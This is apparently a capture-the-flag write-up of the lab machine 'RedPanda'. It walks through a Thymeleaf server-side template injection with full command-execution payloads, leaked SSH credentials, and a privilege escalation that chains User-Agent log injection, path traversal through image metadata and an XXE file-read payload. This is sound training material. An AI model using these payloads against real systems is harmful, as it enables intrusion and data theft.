# RedPanda

## Summary

Our Nmap scan reveals SSH and a web server on port `8080`. The web server allows us to search red panda images and view statistics about the number of views an image has. The title of the pages says that the application is made with [Spring Boot](https://spring.io/projects/spring-boot). We fuzz for various vulnerabilities in the "search" field and eventually find a server side template injection (SSTI) vulnerability. Unable to easily get a reverse shell, we write a basic [read–eval–print loop](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop) (REPL) using python: [rps_repl](rps_repl.py). Using this program, we read the contents of the main web application logic file and find a password, which can be used to SSH to the box and get the `user.txt` flag.

Once we are on the machine, we run [pspy](https://github.com/DominicBreuker/pspy) and notice a cleanup script that removes images and XML files from a few directories. We also notice a `LogParser` program that is ran frequently as root. We analyze the program and its relationship with the "Red Panda Search" application and plan out an exploit that is somewhat complicated. Basically, `LogParser` reads a request log file created by "Red Panda Search." When, `LogParser` sees a new request for an image, it will read the "Author" metadata field of that image and load, update, and overwrite an XML file based on that author name. We can control the request log through a request with a specific user agent and use a XML External Entity (XXE) attack to read the `root.txt` flag into our own XML file.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.170 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.170`.

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 01 Aug 2022 01:26:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 01 Aug 2022 01:26:26 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 01 Aug 2022 01:26:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=7/31%Time=62E72BC2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2001\x20Aug\x20
SF:2022\x2001:26:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Mo
SF:n,\x2001\x20Aug\x202022\x2001:26:26\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Mon,\x2001\x20Aug\x202022\x2001:26:26\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds
```

### Red Panda Search (Port `8080`)

We can search for different red pandas:

![](screenshots/Screenshot%202022-07-31%20at%2021-26-18%20Red%20Panda%20Search%20Made%20with%20Spring%20Boot.png)

Searching for "a" finds some pandas and they each have an "author" link:

![](screenshots/Screenshot%202022-07-31%20at%2021-29-12%20Red%20Panda%20Search%20Made%20with%20Spring%20Boot.png)

Clicking the "author" link gives us some statistics about the images that author has posted to the site:

![](screenshots/Screenshot%202022-07-31%20at%2021-29-32%20Red%20Panda%20Search%20Made%20with%20Spring%20Boot.png)

The `nmap` scan and the website page titles say that the website is made with "Spring Boot." According to [GitHub: spring-projects/spring-boot](https://github.com/spring-projects/spring-boot), "Spring Boot helps you to create Spring-powered, production-grade applications and services with absolute minimum fuss. It takes an opinionated view of the Spring platform so that new and existing users can quickly get to the bits they need." According to [Wikipedia](https://en.wikipedia.org/wiki/Spring_Framework), "the Spring Framework is an application framework and inversion of control container for the Java platform. The framework's core features can be used by any Java application, but there are extensions for building web applications on top of the Java EE platform."

After trying some directory bruteforcing and fuzzing inputs/parameters for SQLi and LFI, we eventually decide to  try server side template injection (SSTI).

We use Java-specific SSTI payloads from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java). Trying to search for `${7*7}` results in `You searched for: Error occured: banned characters`. Searching for `$` causes the same issue, so it looks like the `$` symbol is banned.

Searching for "spring boot template engine" finds [documentation of the various theme engines available to use](https://docs.spring.io/spring-framework/docs/4.3.0.RC2/spring-framework-reference/html/view.html). We look through the Java theme engines in the [HackTricks SSTI page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java). After trying a few options we realize that `#{7*7}` works and outputs `You searched for: ??49_en_US??`. Additionally, `(7*7)` works and outputs `49`.

I'm not yet sure what templating engine is being used, but according to [this post](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) there are different expression types in Thymeleaf. Specifically "*{...}: Selection expressions – similar to variable expressions but used for specific purposes." Running `*{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}` from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java) (but with the `$` replaced with a `*`) outputs `You searched for: Process[pid=6138, exitValue="not exited"]`. Spinning up a web server with `python -m http.server 8080` and searching for `*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.98:8080')}` lists a request in the web server logs. So, we have achieved command execution, we just are not getting the output. Using the payload below from PayloadsAllTheThings (again replacing `$` with a `*`) gives the command output:

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

![](screenshots/Screenshot%202022-07-31%20at%2022-09-21%20Red%20Panda%20Search%20Made%20with%20Spring%20Boot.png)

Additionally, running `*{T(java.lang.System).getenv()}` prints the current environment variables and reveals that the current user is `woodenk` and it shows `SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`, so we know the directory that the application runs out of.

## Foothold

After trying to get a reverse shell for way to long (using various tools and payloads), we write a basic REPL with python to automatically encode commands and retrieve their output: [rps_repl](rps_repl.py). The "rps" in the name stands for "Red Panda Search." The SSTI payload is based on [VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload/), which itself is based on the super long SSTI above from PayloadsAllTheThings.

From before, we know that the "Red Panda Search" application runs from `/opt/panda_search/`, so we explore that directory. We eventually find `cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java`:

```java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println('"' + author + '"');
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

This file contains credentials: `woodenk:RedPandazRule`. We can use these credentials to connect over SSH by running `ssh woodenk@10.10.11.170` and entering the password. Now, just run `cat ~/user.txt` to get the `user.txt` flag.

## Privilege Escalation

We reconnect using [pwncat](https://github.com/calebstewart/pwncat) to make file uploads easier: `pwncat-cs woodenk@10.10.11.170`. We upload [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) by running `upload linpeas.sh` in the local shell. Run LinPEAS with `./linpeas.sh -a 2>&1 | tee linpeas_report.txt`. Download the report with `download linepeas_report.txt` in the local terminal. You can open [linpeas_report.txt](./linpeas_report.txt) with `less -R linpeas_report.txt`.

LinPEAS says the box is vulnerable to `CVE-2021-3560`, but using [secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) to try to exploit it doesn't work. LinPEAS also finds an interanally running MySQL database at `127.0.0.1:3306`. This is probably the database for the "Red Panda Search" website, so it is unlikely to have anything useful and we will only look at it if necessary.

We upload [pspy](https://github.com/DominicBreuker/pspy) to monitor processes as an non-privileged user and see this:

```
2022/08/01 04:05:01 CMD: UID=0    PID=66397  | sudo -u woodenk /opt/cleanup.sh
2022/08/01 04:05:01 CMD: UID=1000 PID=66400  |
2022/08/01 04:05:01 CMD: UID=1000 PID=66399  | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66398  | /bin/bash /opt/cleanup.sh
2022/08/01 04:05:01 CMD: UID=1000 PID=66401  | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66402  | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66403  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66406  | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66408  |
2022/08/01 04:05:01 CMD: UID=1000 PID=66409  | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ;
2022/08/01 04:05:01 CMD: UID=1000 PID=66410  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```

Let's view the cleanup script by running `cat /opt/cleanup.sh`:

```
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

Looks like it removes JPG images and XML files from a variety of places, including `woodenk`'s home directory. This is strange. Why would these files would need to be deleted?

Pspy also shows a `LogParser` program that is ran frequently **as root**:

```
2022/08/01 17:18:01 CMD: UID=0    PID=2382   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
2022/08/01 17:18:01 CMD: UID=0    PID=2381   | /bin/sh /root/run_credits.sh
2022/08/01 17:18:01 CMD: UID=0    PID=2380   | /bin/sh -c /root/run_credits.sh
2022/08/01 17:18:01 CMD: UID=0    PID=2379   | /usr/sbin/CRON -f
```

Looking in `/opt` (directory above the "Red Panda Search" application), we find `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`:

```java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);


        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);

        Document doc = saxBuilder.build(fd);

        Element rootElement = doc.getRootElement();

        for(Element el: rootElement.getChildren())
        {


            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

Looks like `LogParser` reads the "Red Panda Search" log file located at `/opt/panda_search/redpanda.log` and will update the number of views each image and author has.

The `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java` file shows how this log file is generated:

```java
package com.panda_search.htb.panda_search;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletResponse;

import java.io.BufferedWriter;
import java.io.FileWriter;

import javax.servlet.http.HttpServletRequest;

import org.apache.catalina.User;
import org.springframework.web.servlet.ModelAndView;

public class RequestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());
        return true;
    }

    @Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}
```

It simply logs all the requests to the application and splits each componenet with a double pipe (`||`). So `LogParser` will do the following:

1. Read the log file line by line
2. Check if the line pertains to an image
3. Read the "Artist" metadata field from the image specified by the request URI
4. Use that "Artist" field to load the XML file at `"/credits/" + artist + "_creds.xml"`
5. And then finally update the views for that image and the artist's total views in their XML file.

We can abuse this because we can control which XML file is read due to a bug in how the log is generated and how `parseLog` works. One line in the log file looks like this: `200||10.10.14.98||python-requests/2.25.1||/search`. Each component is joined with a `||`. The `LogParser` program then reads the file and determines the URI of the request by spliiting the line on `||`. We control our user agent, which is logged as the 3rd item in each row. If we add the symbol `||` to our user agent then anything after that symbol will be read as the URI, while the actual URI will be ignored. This is because the `parseLog` function always takes the 4th item in the line as the URI. So, with a modified user agent, a line in the log file could look like this: `200||10.10.14.98||python-requests/2.25.1||/our-custom-uri||/search`.

Going through `LogParser`'s `main` function, we now control `parsed_data.get("uri")`, which means we control the input to `getArtist`, so let's examine that function. This function read the JPEG "Artist" field from the metadata of the image at `"/opt/panda_search/src/main/resources/static" + uri`, but we control `uri` so we could redirect it to any image using relative paths with anything in the "Artist" field.

Now, we contol `artist` in the `LogParser`'s `main` function. Thus, we control `xmlPath` using relative paths since it is set to `"/credits/" + artist + "_creds.xml"`. The `addViewTo` function is called on our XML file and (as long as we have the correct format) the file has certain view counters incremented.

We can make the application parse and overwrite an XML file we specify, which means we can use a XML External Entity (XXE) attack, which "is a type of attack against an application that parses XML input according to [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity). [This article](https://portswigger.net/web-security/xxe/xml-entities) gives a great introduction and [this article](https://portswigger.net/web-security/xxe) explains how the XXE injection works.

According to [PortSwigger](https://portswigger.net/web-security/xxe): "Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application. XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL."

That aricle also provides this example payload to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Let's use this but make sure it conforms to the format needed by the application:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/root.txt"> ]>
<root>
  <image>
    <uri>/../../../../../../../tmp/random.jpg</uri>
    <root_flag>&xxe;</root_flag>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</root>
```

Let's save this to `/tmp/exploit_creds.xml`. The name matters since part of it is hardcoded in `LogParser`'s `main` function.

We need a root element (`root`) and then an `image` element with the `uri` and `views` properties. We also need `totalviews` so the application can increment that. The `uri` needs to be set to the same path as our image due to the `el.getChild("uri").getText().equals(uri)` check in the `addViewTo` function.

Let's generate the image with the modified "Artist" metadata field. Generate a random JPEG with `mx=256;my=256;head -c "$((3*mx*my))" /dev/urandom | convert -depth 8 -size "${mx}x${my}" RGB:- random.jpg` (command from [this StackExchange answer](https://unix.stackexchange.com/a/289670)). Then, use `exiftool` to set the "Artist" field to the path to our XML file: `exiftool -Artist='../tmp/exploit' random.jpg`. We go back one directory to exit `/credits` and then only specify the first part of the name because `_creds.xml` is added in the code.

Now, upload the image using pwncat or using an HTTP server and place it in `/tmp`. Finally, execute `curl -H "User-Agent: a||/../../../../../../../tmp/random.jpg" http://10.10.11.170:8080/` to put our injected URI in the log file. Then, wait a few minutes for the auomated `LogParser` script to run. IT will see our request, load the `random.jpg` image from `/tmp`, read it's "Artist" metadata field, load the XML file at `/tmp/exploit_creds.xml`, and rewrite the XML file with the root flag thanks to our XXE injection.

Right after sending the request with the modified user agent, we look at `/opt/panda_search/redpanda.log` and see our modified line: `200||10.10.14.98||a||/../../../../../../../tmp/random.jpg||/`.

After a few seconds our `/tmp/exploit_creds.xml` file is replaced with this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<root>
  <image>
    <uri>/../../../../../../../tmp/random.jpg</uri>
    <root_flag>6e...75</root_flag>
    <views>1</views>
  </image>
  <totalviews>1</totalviews>
</root>
```

We got the `root.txt` flag. We could now get `/root/.ssh/id_rsa` or abuse a different XXE injection to get a shell.
